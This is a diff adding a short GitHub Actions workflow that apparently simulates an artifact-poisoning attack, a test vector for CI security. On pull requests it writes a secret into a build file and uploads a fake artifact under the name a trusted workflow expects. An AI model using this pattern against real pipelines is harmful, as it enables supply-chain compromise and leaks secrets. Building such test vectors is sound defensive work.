@@ -1,0 +1,20 @@
+name: Vector - Artifact Poison Upload
+on:
+  pull_request:
+
+jobs:
+  upload-poison:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious artifact
+        run: |
+          mkdir -p ./build
+          echo "MALICIOUS_BUILD=true" > ./build/metadata.txt
+          echo "EXFIL=${{ secrets.FAKE_SECRET }}" >> ./build/metadata.txt
+          echo "This simulates a compromised build artifact" > ./build/output.bin
+      
+      - name: Upload artifact (same name as trusted workflow expects)
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-output
+          path: ./build/
